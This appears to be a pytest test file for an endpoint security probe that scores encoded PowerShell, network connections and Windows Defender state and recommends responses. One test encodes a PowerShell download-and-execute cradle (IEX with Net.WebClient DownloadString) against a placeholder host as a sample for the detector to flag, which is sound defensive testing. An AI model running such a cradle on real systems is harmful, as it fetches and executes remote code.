from __future__ import annotations

import base64
import json
from types import SimpleNamespace

from edge_client.security_probe import collector
from edge_client.security_probe.reporter import post_heartbeat
from host_brain.security_immune.models import AssetSnapshot, SecuritySignal
from host_brain.security_immune.policy import SecurityImmunePolicy
from host_brain.security_immune.verdict import MalwareVerdictEngine


def _encode_ps(text: str) -> str:
    return base64.b64encode(text.encode("utf-16le")).decode("ascii")


def test_probe_scores_trusted_encoded_powershell_as_low_signal() -> None:
    encoded = _encode_ps(
        "$ErrorActionPreference='Stop'\n"
        "# Long-lived PowerShell AST parser used by the Rust command-safety layer on Windows.\n"
        "# newline-delimited JSON requests over stdin\n"
        "Write-Output ok"
    )

    severity, evidence = collector.score_encoded_powershell(f"powershell.exe -EncodedCommand {encoded}")

    assert severity == 25
    assert evidence["encoded_command_decoded"] is True
    assert evidence["decoded_dangerous_markers"] == []
    assert "command-safety layer on windows" in evidence["trusted_automation_markers"]


def test_probe_scores_dangerous_encoded_powershell_as_high_signal() -> None:
    encoded = _encode_ps("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')")

    severity, evidence = collector.score_encoded_powershell(f"powershell.exe -EncodedCommand {encoded}")

    assert severity == 80
    assert "downloadstring" in evidence["decoded_dangerous_markers"]


def test_collect_asset_snapshot_composes_probe_sections(monkeypatch) -> None:
    monkeypatch.setattr(collector.socket, "gethostname", lambda: "probe-host")
    monkeypatch.setattr(collector, "collect_ip_addresses", lambda: ["192.168.1.50"])
    monkeypatch.setattr(
        collector,
        "collect_process_signals",
        lambda max_processes: (
            [collector._signal("encoded_powershell", "PowerShell encoded command", 25, "process")],
            {"process_count_seen": 3, "process_scan_truncated": False},
        ),
    )
    monkeypatch.setattr(
        collector,
        "collect_network_summary",
        lambda max_connections: (
            [collector._signal("many_established_connections", "Many connections", 45, "network")],
            {"network_available": True, "established_count": 90},
        ),
    )
    monkeypatch.setattr(
        collector,
        "collect_windows_defender_signals",
        lambda: (
            [collector._signal("defender_realtime_disabled", "Defender realtime disabled", 75, "defender")],
            {"defender_available": True, "realtime_protection_enabled": False},
        ),
    )

    asset = collector.collect_asset_snapshot(max_processes=20, max_connections=20, include_defender=True)

    assert asset["hostname"] == "probe-host"
    assert asset["ip_addresses"] == ["192.168.1.50"]
    assert {signal["signal_id"] for signal in asset["signals"]} == {
        "encoded_powershell",
        "many_established_connections",
        "defender_realtime_disabled",
    }
    assert asset["metadata"]["defender"]["realtime_protection_enabled"] is False


def test_network_summary_ignores_loopback_for_anomaly_threshold(monkeypatch) -> None:
    fake_connections = [
        SimpleNamespace(status="ESTABLISHED", raddr=SimpleNamespace(ip="127.0.0.1"))
        for _ in range(80)
    ]
    fake_connections.extend(
        SimpleNamespace(status="ESTABLISHED", raddr=SimpleNamespace(ip=f"203.0.113.{idx % 10 + 1}"))
        for idx in range(10)
    )
    fake_psutil = SimpleNamespace(net_connections=lambda kind: fake_connections)
    monkeypatch.setitem(__import__("sys").modules, "psutil", fake_psutil)

    signals, meta = collector.collect_network_summary(max_connections=200)

    assert signals == []
    assert meta["established_count"] == 90
    assert meta["external_established_count"] == 10


class _FakeResponse:
    status = 200

    def __init__(self, payload: dict) -> None:
        self._payload = payload

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        return False

    def read(self) -> bytes:
        return json.dumps(self._payload).encode("utf-8")


def test_post_heartbeat_uses_internal_security_endpoint(monkeypatch) -> None:
    captured = {}

    def _fake_urlopen(request, timeout):  # noqa: ANN001, ANN202
        captured["url"] = request.full_url
        captured["timeout"] = timeout
        captured["body"] = json.loads(request.data.decode("utf-8"))
        return _FakeResponse({"ok": True, "asset_count": 1})

    monkeypatch.setattr("edge_client.security_probe.reporter.urllib.request.urlopen", _fake_urlopen)

    result = post_heartbeat(host_url="http://host.local:18080", asset={"asset_id": "a1"}, timeout_s=1.5)

    assert result["ok"] is True
    assert captured["url"] == "http://host.local:18080/internal/security/probe/heartbeat"
    assert captured["timeout"] == 1.5
    assert captured["body"]["asset"]["asset_id"] == "a1"


def test_defender_probe_signal_gets_specific_response_actions(tmp_path) -> None:
    policy = SecurityImmunePolicy(state_dir=tmp_path)
    engine = MalwareVerdictEngine(policy)
    asset = AssetSnapshot(
        asset_id="endpoint-1",
        hostname="endpoint-1",
        os_family="Windows",
        signals=[
            SecuritySignal(
                signal_id="defender_realtime_disabled",
                title="Defender realtime disabled",
                severity=75,
                category="defender",
            )
        ],
    )

    incident = engine.evaluate_asset(asset)

    assert incident is not None
    action_ids = {action.action_id for action in incident.recommended_actions}
    assert "run_defender_quick_scan" in action_ids
    assert "enable_defender_protection" in action_ids
